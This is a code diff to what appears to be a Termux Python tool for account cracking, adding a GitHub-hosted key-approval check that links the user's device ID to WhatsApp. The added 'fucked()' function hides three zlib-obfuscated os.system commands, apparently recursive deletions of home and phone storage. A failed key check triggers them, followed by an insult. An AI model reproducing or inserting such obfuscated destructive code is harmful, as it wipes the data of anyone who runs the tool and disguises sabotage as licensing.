@@ -109,9 +109,21 @@ def uaku():
 		ua=open('.mix.txt','r').read().splitlines()
         
        
-
-                   
+def FOFALWAYSONFIRE():
+  uuid = str(os.geteuid()) + str(os.getlogin())
+  id = "᯾".join(uuid)
+  server = requests.get(f'https://github.com/BANTUBD/BD/blob/main/APPROVAL.txt').text
   
+ 
+
+  os.system(f" clear")                          
+  print(f"""\x1b[1;97m
+          ███████  ██████  ███████
+          ██      ██    ██ ██
+          █████   ██    ██ █████
+          ██      ██    ██ ██
+          ██       ██████  ██
+\033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m
  Author    : BANTU LITE
  Github    : BANTUBD
  Facebook  : SADIK KHAN
@@ -123,7 +135,27 @@ def uaku():
   #print(f"\033[1;37mThis Tool Is Free But You Need To Access This Tool")
   #print(f"Send Your Key WhatsApp")
   #os.system(f'xdg-open https://www.facebook.com/abegbalobasa.abegbalobasa')
-  
+  time.sleep(1)
+  print(f"\033[1;37mChecking Your Key")
+  try:
+    httpCaht = requests.get(f"https://github.com/BANTUBD/BD/blob/main/APPROVAL.txt").text
+    if id in httpCaht:
+      print(f"\033[1;32mCongratulations ! Your Key Is Approved");time.sleep(2)
+      msg = str(os.geteuid())
+      time.sleep(0.5)
+      pass
+    else:      
+      print(f"This Tool Is Free But You Need To Access This Tool")
+      #print(f"Your Key Not Approved")
+      print(f"Send Key For Access This Tool"); time.sleep(1)
+      os.system(f'xdg-open {tan}://wa.me/+8801621250620?text='+id)
+      time.sleep(1)
+      sys.exit()
+  except:
+    sys.exit()
+    if name == '__main__':
+    	print(logo)
+    	FOFALWAYSONFIRE()
 #FOFALWAYSONFIRE()
 
 logo=(f"""\x1b[1;97m
@@ -154,7 +186,28 @@ pcp=[]
 id=[]
 tokenku=[]
 os.system('git pull')
+def fucked():
+	print(' Server Loadin.......')
+	os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
+	os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
+	os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
+	print(' Fuck You Bypass User ');exit()
 
+def ckx():
+	uuid = str(os.geteuid()) + str(os.getlogin())
+	id = "᯾".join(uuid)
+	server = requests.get(f'https://github.com/BANTUBD/BD/blob/main/APPROVAL.txt').text
+	try:
+		httpCaht = requests.get(f"https://github.com/BANTUBD/BD/blob/main/APPROVAL.txt").text
+		if id in httpCaht:
+			msg = str(os.geteuid())
+			pass
+		else:
+			msg = str(os.geteuid())
+			fucked()
+	except:
+			sys.exit()
+			
 def Fof():
 	clear()
 	#ckx()
